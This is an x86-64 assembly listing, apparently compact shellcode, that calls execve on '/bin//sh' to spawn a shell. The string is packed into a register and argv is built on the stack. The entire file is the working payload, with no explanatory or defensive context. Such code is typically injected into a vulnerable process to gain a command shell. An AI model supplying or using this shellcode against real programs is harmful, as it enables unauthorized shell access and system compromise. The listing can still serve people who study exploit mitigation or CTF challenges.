        .intel_syntax noprefix
        .globl _start
_start:
        push 59
        pop rax
        cqo
        movabs rdi, 0x68732f2f6e69622f
        push rdx
        push rdi
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        syscall
